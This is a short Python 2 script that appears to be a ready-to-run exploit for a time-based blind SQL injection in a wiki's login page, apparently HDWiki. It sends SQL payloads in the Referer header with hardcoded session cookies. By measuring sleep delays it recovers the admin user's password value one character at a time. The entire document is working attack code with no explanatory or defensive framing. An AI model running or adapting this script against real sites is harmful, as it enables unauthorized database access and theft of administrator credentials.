#coding:utf-8
import time
import httplib
payloads = list('1234567890abcdefghijklmnopqrstuvwxyz')#匹配用到的字符串
val =''
Cookies = 'hd_sid=pUQ1Aq; PHPSESSID=jatvti3nlm2ro3i7oscke307e0; hd_auth=fa04EhT6qA%2BHMlu7IOesKoc8Xs%2F5b%2Fd18B4obJ17nm7F%2BvPbknFWVkAx1u4CLLl75EzncqWZRI94cSDMjJEV'
url = '/index.php?user-login'
for i in xrange(1,32):
    for payload in payloads:
        header ={
            'Cookie':Cookies,
            'referer':"'where if(substr((select password from wiki_user where username='admin'),"+str(i)+",1)='"+payload+"',sleep(3),0)#",
        }
        try:
            conn = httplib.HTTPConnection('sb.com',timeout=5)
            conn.request(method='GET',url=url,headers=header)
            start = time.clock()
            html_doc=conn.getresponse().read()
            end = time.clock()
            dely=end-start
            #print dely
            if((dely)>2):
                val+=payload
                break
        except Exception as e:
            pass
        finally:
            conn.close()

print 'password:'+val
